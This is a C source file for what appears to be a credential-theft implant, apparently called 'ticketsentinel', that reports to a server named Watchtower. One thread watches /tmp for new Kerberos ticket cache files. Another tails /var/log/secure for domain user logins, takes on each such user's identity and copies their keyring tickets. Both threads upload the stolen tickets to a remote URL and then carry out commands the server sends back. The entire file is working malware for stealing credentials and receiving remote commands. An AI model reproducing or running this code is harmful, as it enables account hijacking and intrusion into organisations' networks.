#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <fcntl.h>     
#include <unistd.h>    
#include <errno.h>     
#include <pwd.h>
#include <uuid/uuid.h>
#include "config.h"
#include "commands.h"
#include "watcher.h"
#include "http_transport.h"
#include "file_util.h"
#include "kerb.h"

#define DEBUG true

#ifdef DEBUG
#define DBG(...) printf(__VA_ARGS__)
#else
#define DBG(...)
#endif



char *ccache[MAX_FILENAME_CACHE] = {0};
int ccache_pos = 0;

int ccache_check_cache(const char *name) {
	for(int i = 0; i < MAX_FILENAME_CACHE; i++) {
		if (ccache[i] && strcmp(ccache[i], name) == 0) {
			return 1;
		}
	}
	return 0;
}

void add_to_ccache(const char *name) {
	free(ccache[ccache_pos]);
	ccache[ccache_pos] = strdup(name);
	ccache_pos = (ccache_pos + 1) % MAX_FILENAME_CACHE;
}

// Watch for new ccache files

void *inotify_ccache(void *state){
        int fd;
        int wd;
        int length;
        int i = 0;
        char buffer[BUF_LEN];
        char *ticketloc = NULL;
	ticketsentinel_state_t *agent_state = state;


        if ((fd = inotify_init()) < 0) {
                DBG("[!] ERROR: Could not initiate inotify (CCache)!\n");
                return NULL;
        }
        if ((wd = inotify_add_watch(fd, "/tmp", IN_CREATE | IN_MODIFY)) == -1) {
                DBG("[!] ERROR: Could not add a watcher!! (CCache)\n");
                return NULL;
        }
        DBG("[*] Checking for new tickets (CCache)\n");
        while(1){
                i = 0;
                length = read(fd, buffer, BUF_LEN);
                if (length < 0) {
                        return NULL; //Something bad happened
                }
		bool enabled;
		pthread_mutex_lock(&agent_state->agent_lock);
		enabled = agent_state->ccache_watcher;
		pthread_mutex_unlock(&agent_state->agent_lock);	
		if (!enabled) {
			continue;
		}
                while (i < length){
                        struct inotify_event *event = (struct inotify_event *)&buffer[i];
                        if (event->len && (event->mask == 256)){
                                if (strncmp(event->name, "krb5cc_", strlen("krb5cc_")) == 0){
                                        // Check the cache to avoid flooding
                                        if (!ccache_check_cache(event->name)) {
                                                add_to_ccache(event->name);
                                                DBG("[*] New ccache file found! (%s) -  (%d)\n", event->name, event->mask);
                                                sleep(2);
                                                /* Read ccache file and send it to Watchtower */
                                                asprintf(&ticketloc, "/tmp/%s",event->name);
                                                char* ticketBuf;
                                                size_t ticketLen;
                                                char *urlIngest;
                                                char hostname[HOST_NAME_MAX + 1];
                                                gethostname(hostname, sizeof(hostname));
                                                asprintf(&urlIngest, "%s%s%s/%s/%s", URL, INGEST_URI, agent_state->uuid_agent, hostname, event->name);
                                                if (readFileToBuf(ticketloc, &ticketBuf, &ticketLen) == 0){
							response_buffer_t response_watchtower = {0};
                                                        send_ticket(urlIngest, event->name, ticketBuf, ticketLen, &response_watchtower);
							DBG("[*] Watchtower response: %zu bytes:\n", response_watchtower.size);
							//hex_dump((const unsigned char *)response_watchtower.data, response_watchtower.size);
							parse_commands(&response_watchtower, agent_state);
							free(response_watchtower.data);

                                                }
                                                free(urlIngest);
                                                free(ticketBuf);
                                                free(ticketloc);
                                        }
                                }
                        }
                        i += EVENT_SIZE + event->len;
                }
        }

}


// Watch for new sessions, then grab its uid and loot keyring

void *inotify_keyring(void *state){
    int fd_log;
    int fd_inotify;
    int wd;
    int length;
    int i;
    char buffer[BUF_LEN];
    char log_buf[BUF_LEN];
    ticketsentinel_state_t *agent_state = state;

    fd_log = open("/var/log/secure", O_RDONLY | O_NONBLOCK);
    if (fd_log < 0) {
    DBG("[!] ERROR: Could not open log file!\n");
    return NULL;
    }
    lseek(fd_log, 0, SEEK_END); // move to the end, ignore previous entries
        
    if ((fd_inotify = inotify_init1(IN_NONBLOCK)) < 0){
                DBG("[!] ERROR: Could not initiate inotify (Keyring)!\n");
                return NULL;
    }

    if ((wd = inotify_add_watch(fd_inotify, "/var/log/secure", IN_MODIFY | IN_MOVE_SELF | IN_DELETE_SELF)) == -1) { // Modify to get new entries, move/delete to catch log rotation
                DBG("[!] ERROR: Could not add a watcher!! (Keyring)\n");
                return NULL;

    }
        DBG("[*] Checking for new sessions (Keyring)\n");

    while(1){
        i = 0;
        length = read(fd_inotify, buffer, BUF_LEN);
        if (length < 0 && errno != EAGAIN) {
            return NULL;
        }
        if (length <= 0) {
            usleep(300000);
            continue;
        }
        bool enabled;
        pthread_mutex_lock(&agent_state->agent_lock);
        enabled = agent_state->keyring_watcher;
        pthread_mutex_unlock(&agent_state->agent_lock); 
        if (!enabled) {
            continue;
        }
        while (i < length) {
            struct inotify_event *event = (struct inotify_event *)&buffer[i];
            // Log rotation?
            if(event->mask & (IN_MOVE_SELF | IN_DELETE_SELF)){
                DBG("[*] Log rotated, opening new fd\n");
                close(fd_log);
                fd_log = open("/var/log/secure", O_RDONLY | O_NONBLOCK);
                if (fd_log < 0) {
                    DBG("[!] ERROR: Could not reopen new file!\n");
                    return NULL;
                }
                lseek(fd_log, 0, SEEK_END);
                inotify_rm_watch(fd_inotify, wd);
                wd = inotify_add_watch(fd_inotify, "/var/log/secure", IN_MODIFY | IN_MOVE_SELF | IN_DELETE_SELF);
                continue;
            }
            // Log changed, probably new lined appended
            if(event->mask & IN_MODIFY){
                ssize_t r;
                while((r = read(fd_log, log_buf, sizeof(log_buf)-1)) > 0){
                    log_buf[r] = '\0';

                    char *line = strtok(log_buf, "\n");
                    while(line){
                        char *p = strstr(line, "session opened for user ");
                        if(p){
                            p += strlen("session opened for user ");

                            char username[128];
                            int uid;

                            if(sscanf(p,"%127[^'(](uid=%d)",username,&uid)==2){
                                DBG("[*] Found new session: %s uid=%d\n", username, uid);
                                if(uid >= DOMAIN_UID_THRESHOLD){
                                    DBG("\n[+] User is from domain!\n");
                                    struct passwd *pw = getpwnam(username);
                                    if(!pw){
                                        DBG("[!] ERROR! getpwnam failed!\n");
                                        continue;
                                    }            
                                    pid_t pid = fork();
                                    if(pid == 0){
                                        setgid(pw->pw_gid);
                                        setuid(pw->pw_uid);
                                        uuid_t uuid;
                                        char uuid_ticket[37];
                                        char *ccache_file;
                                        uuid_generate(uuid);
                                        uuid_unparse(uuid, uuid_ticket);
                                        asprintf(&ccache_file, "/tmp/%s", uuid_ticket);
                                        copy_to_ccache(ccache_file);
                                        char* ticketBuf;
                                        size_t ticketLen;
                                        char *urlIngest;
                                        char hostname[HOST_NAME_MAX + 1];
                                        gethostname(hostname, sizeof(hostname));
                                        asprintf(&urlIngest, "%s%s%s/%s/%s", URL, INGEST_URI, agent_state->uuid_agent, hostname, uuid_ticket);
                                        if (readFileToBuf(ccache_file, &ticketBuf, &ticketLen) == 0){
                                                response_buffer_t response_watchtower = {0};
                                                send_ticket(urlIngest, uuid_ticket, ticketBuf, ticketLen, &response_watchtower);
                                                DBG("[*] Watchtower response: %zu bytes:\n", response_watchtower.size);
                                                //hex_dump((const unsigned char *)response_watchtower.data, response_watchtower.size);
                                                parse_commands(&response_watchtower, agent_state);
                                                free(response_watchtower.data);

                                        }
                                        free(urlIngest);
                                        free(ticketBuf);
                                        free(ccache_file);
                                        exit(0);
                                    }         
                                }
                            }
                        }
                        line = strtok(NULL,"\n");
                    }
                }
            }
            i += EVENT_SIZE + event->len;
        }

    }
}





















